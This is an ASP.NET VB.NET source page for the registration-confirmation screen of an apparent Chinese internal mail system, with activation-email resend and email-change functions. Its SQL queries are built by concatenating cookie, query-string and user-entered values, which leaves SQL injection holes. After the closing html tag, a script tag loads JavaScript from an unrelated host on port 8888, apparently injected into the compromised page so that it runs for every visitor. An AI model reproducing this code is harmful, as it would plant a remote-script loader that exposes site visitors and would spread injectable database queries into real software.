<%@ Page Language="VB" %>
<%@ Register Assembly="System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    Namespace="System.Web.UI" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    Dim dbconn As New dbconn
    Dim conn As Data.OleDb.OleDbConnection
    Dim cmd As Data.OleDb.OleDbCommand
    Dim FunctionClass As New FunctionClass
    Dim dr As Data.OleDb.OleDbDataReader
    Dim rndtext As String
    Dim username As String
    Dim email As String
    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs)
        dbconn.Create()
        conn = dbconn.GetConn()
        cmd = conn.CreateCommand
        Dim username As String
        Dim rndtext As String
        If Request.Cookies("nbmailsystem") Is Nothing Then
            Exit Sub
        End If
        If Request.Cookies("nbmailsystem")("username") Is Nothing Or Request.Cookies("nbmailsystem")("rndtext") Is Nothing Then
            Response.Redirect("index.aspx")
        End If
        username = Trim(Request.Cookies("nbmailsystem")("username").ToString())
        rndtext = Trim(Request.Cookies("nbmailsystem")("rndtext").ToString())
        cmd.CommandText = "select count(*) as count001 from [userinfo] where [username]='" & username & "' and [rndtext]='" & rndtext & "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        If dr("count001") <= 0 Then
            dr.Close()
            Response.Redirect("index.aspx")
        End If
        dr.Close()
    End Sub
    Protected Sub Page_Unload(ByVal sender As Object, ByVal e As System.EventArgs)
        If (conn Is Nothing) = False Then
            dbconn.Close()
            conn = Nothing
            dbconn = Nothing
            cmd = Nothing
        End If
    End Sub
    Protected Sub Timer_timemsg_Tick(ByVal sender As Object, ByVal e As System.EventArgs)
        Dim tempmsg As String
        Select Case Now.Hour
            Case 0 To 4
                tempmsg = "凌晨好！"
            Case 5 To 7
                tempmsg = "早上好！"
            Case 8 To 11
                tempmsg = "上午好！"
            Case 12
                tempmsg = "中午好！"
            Case 13 To 17
                tempmsg = "下午好！"
            Case 18 To 23
                tempmsg = "晚上好！"
        End Select
        Label_timemsg.Text = "现在是" + CStr(Now.Date.Year) + "年" + Right("0" + CStr(Now.Month), 2) + "月" + Right("0" + CStr(Now.Day), 2) + "日" + " " + Right("0" + CStr(Now.Hour), 2) + "时" + Right("0" + CStr(Now.Minute), 2) + "分" + Right("0" + CStr(Now.Second), 2) + "秒 " + tempmsg
    End Sub
    Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs)
        username = Request.QueryString("username")
        If username = "" Then
            FunctionClass.DisplayErr(weberr.parerr)
        ElseIf FunctionClass.IsTrue(username) = False Then
            FunctionClass.DisplayErr(weberr.sqlerr)
        Else
            cmd.CommandText = "select * from userinfo where username='" + username + "'"
            dr = cmd.ExecuteReader()
            If dr.HasRows() = False Then
                FunctionClass.DisplayErr(weberr.parerr)
            Else
                dr.Read()
                rndtext = dr("rndtext")
                email = dr("e-mail")
            End If
        End If
        dr.Close()
        Label_email.Text = email
    End Sub
    Protected Sub Button_sendagain_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        cmd.CommandText = "select * from webinfo"
        dr = cmd.ExecuteReader
        dr.Read()
        FunctionClass.sendmail(email, "注册成功", "恭喜您成功注册" + dr("comname") + "内部邮件系统。<br>您的账号是：" + username + "<br>请将以下链接复制到地址栏中打开：" + FunctionClass.GetUrl() + "/activeuser.aspx?username=" + username + "&rndtext=" + rndtext)
        dr.Close()
        MsgBox("发送成功！", 4096, "成功")
    End Sub
    Protected Sub Button_changeemail_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        Dim tempemail As String
        tempemail = Trim(InputBox("请输入新的注册邮箱：", "修改注册邮箱"))
        If tempemail <> "" Then
            If FunctionClass.checkemail(tempemail) = False Then
                MsgBox("注册邮箱非法！", 4096, "错误")
            Else
                cmd.CommandText = "select * from userinfo where username='" + username + "'"
                dr = cmd.ExecuteReader()
                If dr.HasRows() = False Then
                    FunctionClass.DisplayErr(weberr.parerr)
                Else
                    dr.Read()
                    If dr("active") = True Then
                        MsgBox("账号已被激活，无法修改！", 4096, "错误")
                        dr.Close()
                        Exit Sub
                    End If
                End If
                dr.Close()
                cmd.CommandText = "select count(*) as count001 from userinfo where [e-mail]='" + tempemail + "'"
                dr = cmd.ExecuteReader()
		dr.read()
                If dr("count001") >0 Then
                    MsgBox("E-mail已被使用！", 4096, "错误")
                    dr.Close()
                    Exit Sub
                End If
                dr.Close()
                cmd.CommandText = "update [userinfo] set [e-mail]='" + tempemail + "' where [username]='" + username + "'"
                If cmd.ExecuteNonQuery() > 0 Then
                    MsgBox("修改成功！", 4096, "成功")
                    email = tempemail
                    Label_email.Text = email
                    cmd.CommandText = "select * from webinfo"
                    dr = cmd.ExecuteReader
                    dr.Read()
                    FunctionClass.sendmail(email, "注册成功", "恭喜您成功注册" + dr("comname") + "内部邮件系统。<br>您的账号是：" + username + "<br>请将以下链接复制到地址栏中打开：" + FunctionClass.GetUrl() + "/activeuser.aspx?username=" + username + "&rndtext=" + rndtext)
                    dr.Close()
                Else
                    MsgBox("修改失败！", 4096, "失败")
                End If
            End If
        End If
    End Sub
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<link rel="stylesheet" href="Style.css" type="text/css" />
<link rel="shortcut icon" href="logo.ico" type="image/x-icon" /> 
    <title>
    <% 
        cmd.CommandText = "select * from WebInfo"
        dr = cmd.ExecuteReader()
        If dr.HasRows() = True Then
            dr.Read()
            Response.Write(dr("comname") + "内部邮件系统")
        End If
        dr.Close()
     %>
    </title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:scriptmanager ID="Scriptmanager1" runat="server">
        </asp:scriptmanager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" UpdateMode="Conditional">
        <ContentTemplate> 
        <asp:Timer ID="Timer_timemsg" runat="server" Interval ="1" OnTick="Timer_timemsg_Tick" /> 
        <asp:Label ID="Label_timemsg" runat="server" Text="Label" Width="744px" />
        </ContentTemplate>
        </asp:UpdatePanel>
        <% 
            cmd.CommandText = "select * from WebInfo"
            dr = cmd.ExecuteReader()
            If dr.HasRows() = True Then
                dr.Read()
                Response.Write("<br /><br /><center><img src=logo.jpg><font color=#FFFFFF size=12px>" + dr("comname") + "内部邮件系统欢迎您！</font></center><br /><br />")
            End If
            dr.Close()
        %>
        <center><font size="12px" color="#ffffff">注册成功</font></center>
        <br/>
        <font size="5px" color="#ffffff">您的用户名是：</font><font size="5px" color="#ff0000"><% Response.Write(username)%></font>
        <br/>
        <font size="8px" color="#ff0000">请尽快激活！</font>
        <br/>
        <font size="5px" color="#ffffff">您的注册邮箱是：<asp:Label ID="Label_email" runat="server" Width="544px" ForeColor="Red" Font-Size="15pt"></asp:Label><br />
        </font><font size="5px" color="#ff0000"></font>
        <asp:Button ID="Button_sendagain" runat="server" OnClick="Button_sendagain_Click"
            Text="重新发送激活邮件" /><br />
        <asp:Button ID="Button_changeemail" runat="server" Text="修改注册邮箱" OnClick="Button_changeemail_Click" /></div>   
    </form>
</body>
</html>
<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>